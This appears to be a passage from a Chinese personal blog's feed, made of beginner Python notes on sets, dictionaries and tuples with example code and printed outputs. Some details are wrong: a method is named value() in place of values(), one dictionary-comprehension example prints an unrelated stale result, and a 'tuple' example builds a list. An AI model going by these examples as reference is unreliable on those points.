class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s3</span>=<span class="hljs-symbol">set</span>((<span class="hljs-symbol">1,<span class="hljs-symbol">2</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">5</span>,<span class="hljs-symbol">65</span></span>))<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s3,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s3</span>)) #{<span class="hljs-number">65</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #集合中元素无序<br><span class="hljs-symbol">s4</span>=<span class="hljs-symbol">set</span>('<span class="hljs-symbol">python</span>')<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s4,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s4</span>)) #{<span class="hljs-string">'o'</span>, <span class="hljs-string">'n'</span>, <span class="hljs-string">'y'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'h'</span>, <span class="hljs-string">'p'</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s5</span>=<span class="hljs-symbol">set</span>({<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">23</span>})<br>print(s5,type(s5)) #{<span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">12</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #空集合<br><span class="hljs-symbol">s6</span>={} #字典类型<br>print(type(s6)) #&lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">dict</span>'&gt;<br><span class="hljs-symbol">s7</span>=<span class="hljs-symbol">set</span>()<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s7,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s7</span>)) #<span class="hljs-symbol">set</span>() &lt;<span class="hljs-symbol">class</span> '<span class="hljs-symbol">set</span>'&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h2><p>（1）判断： in 或 not in</p><p>（2）新增：</p><ul><li>add() : 一次添加一个元素</li><li>update() : 至少添加一个元素</li></ul><p>（3）删除：</p><ul><li>remove() : 一次删除一个指定元素，指定元素不存在抛出keyerror</li><li>discard(): 一次删除一个注定元素，指定元素不存在不抛出异常</li><li>pop(): 一次随机删除一个任意元素</li><li>clear(): 清空</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>} <br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> in s) #True<br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> not in s) #False<br><span class="hljs-attribute">s</span>.add(<span class="hljs-number">80</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">80</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>}<br><span class="hljs-attribute">s</span>.update({<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>})<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">89</span>])<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">78</span>,<span class="hljs-number">64</span>,<span class="hljs-number">56</span>])<br><span class="hljs-attribute">print</span>(s)  #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>} <br><span class="hljs-attribute">s</span>.remove(<span class="hljs-number">100</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">500</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">300</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.pop()<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.clear()<br><span class="hljs-attribute">print</span>(s) #set()<br></code></pre></td></tr></tbody></table></figure><h2 id="集合间的关系"><a href="#集合间的关系" class="headerlink" title="集合间的关系"></a>集合间的关系</h2><ul><li>是否相等： == 或 !=</li><li>一个集合是否为另一集合的子集： issubset<ul><li>b是a的子集</li></ul></li><li>一个集合是否为另一集合的超集： issuperset<ul><li>a是b的超集</li></ul></li><li>两集合是否无交集： isdisjoint</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br><span class="hljs-attribute">s2</span>={<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">20</span>,<span class="hljs-number">10</span>}<br><span class="hljs-attribute">print</span>(s==s2) #True<br><span class="hljs-attribute">print</span>(s!=s2) #False<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br>s2={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s3={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">90</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.issubset(s1)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s3.issubset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s3)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s3)</span></span>)<br>s4={<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s4)</span></span>)<br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#False</span><br> #True<br></code></pre></td></tr></tbody></table></figure><h2 id="集合的数学操作"><a href="#集合的数学操作" class="headerlink" title="集合的数学操作"></a>集合的数学操作</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s2={<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.intersection(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 &amp; s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.union(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 | s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1-s2)</span></span> #{<span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.symmetric_difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1^s2)</span></span> #{<span class="hljs-number">50</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>}<br></code></pre></td></tr></tbody></table></figure><h2 id="集合生成式"><a href="#集合生成式" class="headerlink" title="集合生成式"></a>集合生成式</h2><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lst</span>=[i*i for i in range(<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(lst) #[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>]<br><span class="hljs-attribute">s</span>={i*i for i in range(<span class="hljs-number">6</span>)}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;集合&quot;&gt;&lt;a href=&quot;#集合&quot; class=&quot;headerlink&quot; title=&quot;集合&quot;&gt;&lt;/a&gt;集合&lt;/h1&gt;&lt;p&gt;python内置数据结构，可变序列，无value的字典。&lt;/p&gt;
&lt;h2 id=&quot;创建：&quot;&gt;&lt;a href=&quot;#创建：&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习4</title>
    <link href="https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/"/>
    <id>https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/</id>
    <published>2022-09-05T09:05:23.791Z</published>
    <updated>2022-09-05T11:20:04.588Z</updated>
    
    <content type="html"><![CDATA[<p>(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断)</p><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>列表： []</p><p>字典： {} 可变序列，以键值对方式存储数据</p><p>根据key查找value所在位置。</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><pre><code class="hljs">score={'张三':100,'李四':98,'王五':45}内置函数dict(name='jack',age=20)</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score)</span></span> #{<span class="hljs-string">'张三'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'李四'</span>: <span class="hljs-number">98</span>, <span class="hljs-string">'王五'</span>: <span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(score)</span></span>) #&lt;class <span class="hljs-string">'dict'</span>&gt;<br>s=<span class="hljs-built_in">dict</span>(name=<span class="hljs-string">'jack'</span>,age=<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'jack'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>}<br>d={}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{}<br></code></pre></td></tr></tbody></table></figure><h2 id="元素获取"><a href="#元素获取" class="headerlink" title="元素获取"></a>元素获取</h2><ul><li>[]: score[‘张三’] <ul><li>若字典中不存在指定key,则抛出keyerror</li></ul></li><li>get(): score.get(‘张三’)<ul><li>若不存在key，则返回None</li></ul></li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score[<span class="hljs-string">'张三'</span>])</span></span> <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'张三'</span>)</span></span>) <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'陈六'</span>)</span></span>) <span class="hljs-selector-id">#None</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'嘛七'</span>,<span class="hljs-number">99</span>)</span></span>) #<span class="hljs-number">99</span> #<span class="hljs-number">99</span>是嘛七所对value不存在时提供的默认值<br></code></pre></td></tr></tbody></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="key的判断"><a href="#key的判断" class="headerlink" title="key的判断"></a>key的判断</h3><ul><li>in : key在字典中返回True</li><li>not in : key不在字典中返回True</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> in score)</span></span> <span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> not in score)</span></span> #False<br></code></pre></td></tr></tbody></table></figure><h3 id="元素删除"><a href="#元素删除" class="headerlink" title="元素删除"></a>元素删除</h3><pre><code class="hljs">del score['张三']print(score) #{'李四': 98, '王五': 45}score.clear() #清空字典print(score) #{}</code></pre><h3 id="元素新增"><a href="#元素新增" class="headerlink" title="元素新增"></a>元素新增</h3><pre><code class="hljs">score['陈六']=98print(score) #{'李四': 98, '王五': 45, '陈六': 98}</code></pre><h3 id="元素修改"><a href="#元素修改" class="headerlink" title="元素修改"></a>元素修改</h3><pre><code class="hljs">score['陈六']=1001print(score) #{'李四': 98, '王五': 45, '陈六': 1001}</code></pre><h3 id="获取字典视图的三个方法"><a href="#获取字典视图的三个方法" class="headerlink" title="获取字典视图的三个方法"></a>获取字典视图的三个方法</h3><ul><li>keys() 获取字典中所有key</li><li>value() 获取字典中所有value</li><li>items() 获取字典中所有key,value对</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br> #获取所有key<br>keys=score<span class="hljs-selector-class">.keys</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(keys)</span></span> <span class="hljs-selector-id">#dict_keys</span>(<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(keys)</span></span>) #<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span> 将所有key组成的视图转成列表<br> #获取所有value<br>values=score<span class="hljs-selector-class">.values</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(values)</span></span> <span class="hljs-selector-id">#dict_values</span>(<span class="hljs-selector-attr">[100, 98, 45]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(values)</span></span>) #<span class="hljs-selector-attr">[100, 98, 45]</span><br> #获取所有键值对<br>items=score<span class="hljs-selector-class">.items</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(items)</span></span> <span class="hljs-selector-id">#dict_items</span>(<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(items)</span></span>) #<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="元素遍历"><a href="#元素遍历" class="headerlink" title="元素遍历"></a>元素遍历</h3><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">score={'张三':<span class="hljs-number">100</span>,'李四':<span class="hljs-number">98</span>,'王五':<span class="hljs-number">45</span>}<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>,score[<span class="hljs-built_in">item</span>],score.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">item</span>))<br> <span class="hljs-comment">#张三 100 100</span><br> <span class="hljs-comment">#李四 98 98</span><br> <span class="hljs-comment">#王五 45 45</span><br></code></pre></td></tr></tbody></table></figure><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>所有元素都是key-value键值对，key不可重复，value可重复</li><li>无序</li><li>key不可变</li><li>字典可动态伸缩</li><li>字典较大浪费内存，是一种使用空间换时间的数据结构</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'name'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'李四'</span>}<br>d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'nikename'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br>lst=<span class="hljs-selector-attr">[10,20,30]</span><br>lst<span class="hljs-selector-class">.insert</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span> #<span class="hljs-selector-attr">[10,100,20,30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="字典生成式"><a href="#字典生成式" class="headerlink" title="字典生成式"></a>字典生成式</h3><p>内置函数zip()</p><p>用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回由这些元组组成的列表。</p><pre><code class="hljs">{item.upper() （#这是key）:price(#这是value) for item,price(#自定义变量key,value) in zip(items,prices(#可迭代对象))}</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">items=<span class="hljs-selector-attr">[<span class="hljs-string">'Fruits'</span>,<span class="hljs-string">'Books'</span>,<span class="hljs-string">'Others'</span>]</span><br>prices=<span class="hljs-selector-attr">[96,78,85]</span><br>{ item<span class="hljs-selector-class">.upper</span>():price  <span class="hljs-keyword">for</span> item,price <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(items,prices)}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br></code></pre></td></tr></tbody></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>python内置数据结构之以，不可变序列</p><h2 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h2><ul><li><code>t=('Python','hello',90)</code></li><li>内置函数tuple() <code>t=tuple(('Python','hello',90))</code></li><li>t=(10,) 单元素要加逗号用以区分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t2=<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t2)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t3=(<span class="hljs-string">'Python'</span>,)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t3)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t1=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t1)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br></code></pre></td></tr></tbody></table></figure><p>空列表、字典、元组</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">lst</span><span class="hljs-operator">=</span>[]<br><span class="hljs-attribute">list1</span><span class="hljs-operator">=</span>list()<br><span class="hljs-attribute">d</span><span class="hljs-operator">=</span>{}<br><span class="hljs-attribute">d1</span><span class="hljs-operator">=</span>dict()<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span>()<br><span class="hljs-attribute">t1</span><span class="hljs-operator">=</span>tuple()<br></code></pre></td></tr></tbody></table></figure><h2 id="为何元组不可变"><a href="#为何元组不可变" class="headerlink" title="为何元组不可变"></a>为何元组不可变</h2><p>（1）多任务环境下，同时操作对象时不需要加锁</p><p>（2）元组中存储的是对象的引用：</p><pre><code class="hljs">* 若对象本身不可变，则不能再引用其他对象* 若对象是可变的，则可变对象的引用不允许改变，但数据可以变。</code></pre><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-selector-attr">[10,[20,30]</span>,<span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #<span class="hljs-selector-attr">[10, [20, 30]</span>, <span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">0</span>],type(t[<span class="hljs-number">0</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[0]</span>)) #<span class="hljs-number">10</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843443792</span><br><span class="hljs-function"><span 